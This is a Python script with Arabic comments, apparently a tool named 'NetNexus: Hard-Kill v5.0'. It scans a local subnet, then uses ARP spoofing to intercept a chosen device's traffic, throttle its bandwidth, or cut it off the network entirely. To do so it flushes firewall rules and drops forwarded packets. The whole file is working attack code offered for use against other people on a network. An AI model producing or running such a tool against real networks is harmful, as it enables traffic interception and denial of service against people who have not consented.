import scapy.all as scapy
import os, time, sys, subprocess
from core import scanner, spoof

def set_forwarding(state):
    if state:
        # وضع الاعتراض: تفعيل التمرير وتنظيف الجدار الناري
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
    else:
        # وضع القتل: إغلاق كل المنافذ فوراً
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        # استخدام -I لضمان وضع القاعدة في أعلى القائمة
        subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "DROP"], capture_output=True)

def set_limit(interface, speed):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
    try:
        subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                        "rate", f"{speed}kbps", "latency", "50ms", "burst", "1540"], check=True)
    except: pass

def main():
    iface = "wlan0" # تأكد من 'ip a'
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] Run with sudo!")
        return

    # تم التعديل بناءً على لقطة الشاشة الخاصة بك
    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"
    device_memory = {} 

    while True:
        print("\n" + "="*45)
        print("      NetNexus: Hard-Kill v5.0")
        print("="*45)
        
        device_memory = scanner.scan(ip_range, device_memory)
        current_list = list(device_memory.values())
        
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            print(f"\nTarget: {target['ip']} | [1] Intercept [2] Limit [3] Kill")
            mode = input("Action: ")

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            wait_time = 0.5

            if mode == "1":
                set_forwarding(True)
            elif mode == "2":
                kbps = input("Speed (kbps): ")
                set_forwarding(True)
                set_limit(iface, kbps)
            elif mode == "3":
                set_forwarding(False)
                wait_time = 0.01 # سرعة جنونية للتفوق على الراوتر

            print(f"[*] Attacking {target['ip']}... Ctrl+C to stop.")
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time) 
                
        except Exception as e:
            print(f"[-] Error: {e}")
        except KeyboardInterrupt:
            set_forwarding(True)
            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
            spoof.restore(target['ip'], gateway_ip)
            spoof.restore(gateway_ip, target['ip'])
            break

if __name__ == "__main__":
    main()
